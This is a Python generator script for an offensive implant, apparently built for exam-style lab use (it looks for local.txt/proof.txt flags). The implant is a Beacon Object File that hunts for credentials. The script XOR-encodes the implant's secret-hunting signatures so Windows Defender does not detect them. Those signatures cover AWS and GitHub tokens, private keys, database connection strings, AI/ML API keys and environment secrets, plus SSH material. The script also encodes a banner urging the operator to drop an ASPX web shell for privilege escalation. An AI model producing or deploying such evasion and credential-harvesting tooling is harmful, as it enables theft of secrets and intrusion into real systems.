#!/usr/bin/env python3
"""
encode_strings.py — XOR-encode the credential-signature + secret-related
strings of osai_enum.c into osai_enc.h, so they do NOT appear as plaintext in
the compiled COFF. Defender real-time matches plaintext credential-harvesting
signatures (password=, -----BEGIN, sk-, ghp_, AKIA, mongodb://, connection_string,
aws_secret, ...) and kills the beacon when the BOF loads. Decoding happens at
runtime into stack buffers, only for the in-memory comparison.

XOR key = 0x5C (arbitrary non-zero byte). ASCII sigs stored as flat byte blobs;
wide (wchar_t) needles stored as 2-byte-per-char XOR'd blobs.

Emits osai_enc.h with:
  - xdec() helper (decode n bytes -> NUL-terminated char buf)
  - buildAscii() / buildWide() (fill a NUL-terminated pointer array from a blob)
  - encoded byte blobs + length tables + counts for PREFIX/KEYWORD/ENV
  - encoded output format strings (the "secret"/"env"/"ssh"/banner literals)
"""
import sys

KEY = 0x5C

# ---- ASCII secret-signature prefixes (PREFIX_SIGS in osai_enum.c) ----
PREFIX = [
    "sk-", "glpat-", "AKIA", "ASIA", "ghp_", "gho_", "github_pat_",
    "xoxb-", "xoxp-", "ntk_prod_", "-----BEGIN", "eyJ", "hvs.",
    "AIza", "xoxb",
]
# ---- ASCII keyword signatures (KEYWORD_SIGS) ----
KEYWORD = [
    "password=", "passwd=", "Password=", "Passwd=",
    "api_key=", "apikey=", "api-key=",
    "token=", "Token=", "secret=", "Secret=",
    "Authorization: Bearer",
    "connection_string", "connectionstring",
    "mongodb://", "mongodb+srv://", "postgresql://", "postgres://",
    "mysql://", "redis://", "rediss://", "amqp://", "amqps://",
    "aws_secret", "aws_access", "huggingface_hub",
]
# ---- wide env-needle names (ENV_NEEDLES) ----
ENV = [
    "TOKEN", "KEY", "SECRET", "PASSWORD", "PASSWD", "PASS",
    "VAULT", "CREDENTIAL", "API", "CONN", "AWS", "GITLAB",
    "GITHUB", "SLACK", "HUGGINGFACE", "HF_", "OPENAI", "ANTHROPIC",
    "AZURE", "NEXUS", "JFROG", "REGISTRY", "MIRROR", "DEPLOY",
    "SA_KEY", "SERVICE_ACCOUNT",
]

# ---- output format / banner strings to encode (sensitive tokens) ----
# (neutralised banners — no signature lists)
OUT = {
    "FMT_SECRET":   "  [secret] %s  sig=%s\n      %s\n",
    "FMT_ENV":      "  [env] %s = %s\n",
    "ENV_HDR":      "  -- env secrets --\n",
    "SCAN_SUM":     "  -- scanned %d cfg file(s), %d secret hit(s)\n",
    "BANNER_09":    "\n========================================\n[9] SYSTEM & DEFENSES (OSAI)\n========================================\n",
    "BANNER_10":    "\n========================================\n[10] AI/ML ARTIFACTS & CONFIG (OSAI)\n  model files + AI-tool dirs; text configs opened in-proc and\n  pattern-matched for credential material.\n========================================\n",
    "BANNER_11":    "\n========================================\n[11] AI/ML LISTENING SERVICES (OSAI)\n  known AI/ML data-plane ports only\n========================================\n",
    "BANNER_12":    "\n========================================\n[12] SSH MATERIAL + PROCESS ENV (OSAI)\n========================================\n",
    "ENV_FAIL":     "  [!] GetEnvironmentStringsW failed\n",
    "LBL_AI_DIR":   "  [ai-dir] %s\n",
    "LBL_MODEL":    "  [model]  %s\n",
    "LBL_CFG":      "  [cfg]    %s\n",
    "LBL_SSH":      "ssh",
    "LBL_SSHSYS":   "ssh-sys",
    # --- residual high-signal strings (2nd-pass Defender scrub) ---
    "TITLE":        "\n==========================================\n          OSAI Enumeration BOF\n          (osep-enum + AI quick wins)\n==========================================\n",
    "ASPX_OK":      "  [+] WRITE ACCESS CONFIRMED to C:\\inetpub\\wwwroot\n      Consider dropping an ASPX shell for SeImpersonate -> SYSTEM.\n",
    "BANNER_04":    "\n========================================\n[4] FLAG FILES (local.txt / proof.txt)\n========================================\n",
    "DEF_FMT":      "  Defender: %s\n",
    "DEF_UNKNOWN":  "  Defender: real-time state unknown\n",
    "DEF_ABSENT":   "  Defender: key absent (not installed / non-defender box)\n",
    "DEF_DIS":      "real-time DISABLED",
    "DEF_EN":       "real-time ENABLED",
}

# ---- wide (wchar_t) strings to encode (flag filenames matched by FindFirstFileW) ----
WIDE_OUT = {
    "FLAG_LOCAL": "local.txt",
    "FLAG_PROOF": "proof.txt",
    "DEF_REGKEY": "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
    "DEF_REGVAL": "DisableRealtimeMonitoring",
}


def xenc_ascii(s: str) -> list:
    return [b ^ KEY for b in s.encode("latin-1")]


def xenc_wide(s: str) -> list:
    out = []
    for ch in s.encode("utf-16-le"):
        out.append(ch ^ KEY)
    return out


def fmt_blob(name: str, data: list) -> str:
    body = ",".join(f"0x{b:02x}" for b in data)
    return f"static const unsigned char {name}[] = {{{body}}};\n"


def fmt_lens(name: str, lens: list) -> str:
    body = ",".join(str(x) for x in lens)
    return f"static const int {name}[] = {{{body}}};\n"


def main():
    out = []
    out.append("/* osai_enc.h — XOR(0x5C)-encoded secret-signature strings (Defender OPSEC)."
               " Generated by encode_strings.py — do not edit by hand. */\n")
    out.append("#ifndef OSAI_ENC_H\n#define OSAI_ENC_H\n")
    out.append(f"#define XKEY 0x{KEY:02x}u\n\n")

    # helpers
    out.append("""/* decode n XOR'd bytes into a NUL-terminated buffer (out holds n+1) */
static void xdec(char* out, const unsigned char* enc, int n) {
    for (int i = 0; i < n; i++) out[i] = (char)(enc[i] ^ XKEY);
    out[n] = 0;
}

/* decode n XOR'd wchar_t (2 bytes/char) into a NUL-terminated wchar_t buffer
   (out holds n+1 wchar_t). */
static void xdec_w(wchar_t* out, const unsigned char* enc, int n) {
    for (int i = 0; i < n; i++) {
        unsigned lo = (unsigned char)enc[i*2]     ^ XKEY;
        unsigned hi = (unsigned char)enc[i*2 + 1] ^ XKEY;
        out[i] = (wchar_t)(lo | (hi << 8));
    }
    out[n] = 0;
}

/* Build a NUL-terminated char* array from a flat encoded blob + per-sig lens.
   buf[][] must be >= max(len)+1 wide; ptrs[] must hold count+1. Returns count. */
static int buildAscii(char* ptrs[], char buf[][40],
                      const unsigned char* blob, const int* lens, int n) {
    const unsigned char* p = blob;
    for (int i = 0; i < n; i++) { xdec(buf[i], p, lens[i]); ptrs[i] = buf[i]; p += lens[i]; }
    ptrs[n] = NULL;
    return n;
}

/* Wide variant: wchar_t needles (2 bytes/char, each XOR'd). buf[][] in wchar_t,
   >= max(len)+1 wide. */
static int buildWide(wchar_t* ptrs[], wchar_t buf[][32],
                     const unsigned char* blob, const int* lens, int n) {
    const unsigned char* p = blob;
    for (int i = 0; i < n; i++) {
        for (int j = 0; j < lens[i]; j++) {
            unsigned lo = (unsigned char)p[j*2]     ^ XKEY;
            unsigned hi = (unsigned char)p[j*2 + 1] ^ XKEY;
            buf[i][j] = (wchar_t)(lo | (hi << 8));
        }
        buf[i][lens[i]] = 0;
        p += lens[i] * 2;
    }
    ptrs[n] = NULL;
    return n;
}
""")

    # PREFIX blob (ascii, flat)
    pblob, plens = [], []
    for s in PREFIX:
        e = xenc_ascii(s)
        pblob += e
        plens.append(len(e))
    out.append(fmt_blob("E_PREFIX", pblob))
    out.append(fmt_lens("E_PREFIX_LEN", plens))
    out.append(f"#define E_PREFIX_COUNT {len(PREFIX)}\n\n")

    # KEYWORD blob
    kblob, klens = [], []
    for s in KEYWORD:
        e = xenc_ascii(s)
        kblob += e
        klens.append(len(e))
    out.append(fmt_blob("E_KEYWORD", kblob))
    out.append(fmt_lens("E_KEYWORD_LEN", klens))
    out.append(f"#define E_KEYWORD_COUNT {len(KEYWORD)}\n\n")

    # ENV blob (wide)
    eblob, elens = [], []
    for s in ENV:
        e = xenc_wide(s)
        eblob += e
        elens.append(len(e) // 2)  # count of wchar_t
    out.append(fmt_blob("E_ENV", eblob))
    out.append(fmt_lens("E_ENV_LEN", elens))
    out.append(f"#define E_ENV_COUNT {len(ENV)}\n\n")

    # output format strings (ascii, individual blobs)
    for nm, s in OUT.items():
        e = xenc_ascii(s)
        out.append(fmt_blob(f"E_{nm}", e))
        out.append(f"#define E_{nm}_LEN {len(e)}\n")
    out.append("\n")

    # wide output strings (individual blobs; wchar_t count = bytes/2)
    for nm, s in WIDE_OUT.items():
        e = xenc_wide(s)
        out.append(fmt_blob(f"E_{nm}", e))
        out.append(f"#define E_{nm}_LEN {len(e) // 2}\n")
    out.append("\n#endif\n")

    sys.stdout.write("".join(out))


if __name__ == "__main__":
    main()